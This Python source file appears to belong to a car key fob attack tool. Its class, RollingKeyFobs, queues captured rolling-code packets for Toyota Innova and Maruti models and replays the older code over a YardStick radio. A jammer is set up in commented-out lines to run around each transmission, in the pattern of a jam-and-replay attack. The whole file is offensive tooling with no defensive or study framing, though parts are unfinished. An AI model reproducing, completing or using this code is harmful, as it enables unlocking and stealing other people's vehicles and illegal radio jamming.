from time import time_ns as tns
from typing import List
from termcolor import cprint
from rf import RfSender, RfMessage, MOD_ASK_OOK
from keyfob import InnovaKeyFobPacket, MarutiNipponKeyFobPacket, KeyFobPacket
from jammer import *

# TODO: improve readability

CAR_FOBS = {
    "toyota_innova": InnovaKeyFobPacket,
    "maruti_nippon": MarutiNipponKeyFobPacket
}


class RollingKeyFobs:
    """"
    queue to hold the rolling key fob
    sends out the first key fob in, when the length is 2
    structure of key fobs [[KeyFobPacket, KeyFobPacket,...], [KeyFobPacket, ...]]
    """

    def __init__(self) -> None:
        self.key_fobs_list = []

        self.yd_stick = RfSender()  # RfSender()
        print("the yardstick has been initialized")

        # TODO: configure for raspberry bi
        # self.jammer = Jammer("input_file", "mode", "freq", "sample")
        print("the jammer has been initialized")
        # self.jammer.start()

    def __len__(self):
        return len(self.key_fobs_list)

    def __str__(self):
        str_ = ""
        for key_fb_list in self.key_fobs_list:
            for key_fb in key_fb_list:
                str_ += str(key_fb)
            str_ += "\n--  next key fob --  \n"
        return str_

    def pp_print(self, index) -> None:
        """
        printing for debugging
        :param index: the key fob to print from
        """
        for key_fob in self.key_fobs_list[index]:
            cprint(key_fob, "yellow", "on_blue")
            cprint(f"-- next key fob in index {index} --", "white", "on_green")

    def pp_print_all(self) -> None:
        """
        printing all for debugging
        :return: None
        """
        print("\n\n")
        for i in range(len(self)):
            cprint(f"key fobs in index {i}", "green", "on_yellow")
            self.pp_print(i)
            print("\n")
            cprint(f"next key fob VVV in index {i + 1}", "green", "on_yellow")
        print("\n\n")

    @property
    def dispatchable(self) -> bool:
        """
        checks if there are two valid key fobs \n
        and if the previous one can be sent or not
        """
        if len(self) > 1:
            cur_time = tns()
            if (cur_time - self.key_fobs_list[-1][-1].pk_recv_time) > 800000000:
                return True

        return False

    def __shift(self):
        """
        remove the first element from key fob
        """
        return self.key_fobs_list.pop(0)

    def dequeue_send(self) -> None:
        """
        send the first message in the queue
        """
        cprint("key fobs to be sent", "yellow")
        self.pp_print(0)
        kfbs_to_be_sent = self.__shift()
        print("\n")  # new line

        # TODO: connect with RfMessage
        rf_message = RfMessage(kfbs_to_be_sent, MOD_ASK_OOK, 2500, 1, self.yd_stick)
        # self.jam.stop()
        rf_message.send()
        # self.jam.start()

        cprint("current rolling key_fobs struct", "yellow")
        self.pp_print_all()

        del kfbs_to_be_sent

    def __create_tmp_kfb_pkt_list(self, flt_key_fb_packet: List[str], car_name: str, pk_recv_time: int) \
            -> List[KeyFobPacket]:
        """
        :param flt_key_fb_packet: filtered key fob packet, by the car class
        :param car_name: you know what it is
        :param pk_recv_time: time received
        :return: List[KeyFobPacket]
        """
        kfb_list = []
        for key_fb in flt_key_fb_packet:
            kfb_list.append(CAR_FOBS[car_name](key_fb, car_name, pk_recv_time))
        return kfb_list

    def push(self, key_fb_packet: List[str]) -> None:
        """
        add a new key fob to list or concatenate with previous key fob \n
        :param key_fb_packet: a list in the form ["bits:gap", "bits:gap", "name_of_car"]
        """

        if len(key_fb_packet) < 2:
            cprint("key fob packet is not valid. dropping key fob packet", "white", "on_red")

        cur_time = tns()
        flt_key_fb_packets = CAR_FOBS[key_fb_packet[-1]].filter(key_fb_packet[:-1])
        tmp_kfb_list = self.__create_tmp_kfb_pkt_list(flt_key_fb_packets, key_fb_packet[-1], cur_time)

        if len(self.key_fobs_list) == 0:
            self.key_fobs_list = [tmp_kfb_list]
            cprint(f"first key fob packet received of type {key_fb_packet[-1]}", "white", "on_yellow")
        else:
            if self.key_fobs_list[-1][-1].name != key_fb_packet[-1]:
                cprint("key fob packet is not the same type as previous. dropping key fob packet", "white", "on_red")

            elif (cur_time - self.key_fobs_list[-1][-1].pk_recv_time) < 1000000000:
                self.key_fobs_list[-1] += tmp_kfb_list
                cprint("appending to previous packet", "white", "on_yellow")

            else:
                self.key_fobs_list.append(tmp_kfb_list)
                cprint("new key fob packet received", "white", "on_yellow")
